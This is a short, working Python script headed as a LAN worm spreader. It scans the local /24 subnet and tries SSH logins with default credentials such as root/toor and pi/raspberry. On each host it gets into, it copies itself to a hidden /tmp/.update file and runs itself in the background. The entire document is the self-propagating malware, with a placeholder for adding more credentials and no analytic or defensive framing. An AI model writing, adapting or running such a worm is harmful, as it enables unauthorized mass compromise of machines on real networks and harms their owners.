# Worm LAN spreader — scan /24, copie via SSH paramiko
# deps: paramiko netifaces
import socket,threading,sys,os
from pathlib import Path
import netifaces,paramiko

CREDS    = [("admin","admin"),("root","toor"),("pi","raspberry")]  # FILL
PORT     = 22
TIMEOUT  = 2
SELF     = Path(sys.argv[0]).resolve()
REMOTE   = "/tmp/.update"

def subnet() -> str:
    for iface in netifaces.interfaces():
        for a in netifaces.ifaddresses(iface).get(netifaces.AF_INET,[]):
            ip = a.get("addr","")
            if not ip.startswith("127."): return ".".join(ip.split(".")[:3])
    return "192.168.1"

def spread(ip: str):
    for user,pw in CREDS:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip,PORT,user,pw,timeout=TIMEOUT,banner_timeout=TIMEOUT)
            sftp = ssh.open_sftp()
            sftp.put(str(SELF),REMOTE); sftp.chmod(REMOTE,0o700); sftp.close()
            ssh.exec_command(f"nohup python3 {REMOTE} &"); ssh.close()
            print(f"[+] {ip} ({user})"); return
        except Exception: continue

def run():
    sub = subnet()
    ts  = [threading.Thread(target=spread,args=(f"{sub}.{i}",),daemon=True)
           for i in range(1,255)]
    for t in ts: t.start()
    for t in ts: t.join()

run()
    